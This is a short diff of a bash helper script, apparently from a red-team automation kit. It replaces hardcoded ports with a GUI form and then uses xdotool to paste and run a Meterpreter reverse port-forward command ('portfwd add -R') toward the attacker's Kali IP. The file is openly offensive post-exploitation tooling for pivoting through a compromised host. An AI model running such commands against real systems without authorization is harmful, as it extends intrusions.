@@ -1,10 +1,18 @@
 #!/bin/bash
 
 : '
-meterpreter: forward all trafic from remote port 8443 to local port 1234
+meterpreter: forward all trafic from remote port to local port
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+REMOTE_PORT_FIELD=$(form_item  "Remote port" "remote_port")
+LOCAL_PORT_FIELD=$(form_item  "Local port" "local_port")
 
-paste_command "portfwd add -R -l 8443 -p 1234 -L ${KALI_IP}"
+# Generate GUI form
+generate_form "${REMOTE_PORT_FIELD}" "${LOCAL_PORT_FIELD}"
+
+REMOTE_PORT=${form_data["remote_port"]}
+LOCAL_PORT=${form_data["local_port"]}
+
+paste_command "portfwd add -R -l ${REMOTE_PORT} -p ${LOCAL_PORT} -L ${KALI_IP}"
+xdotool key Return
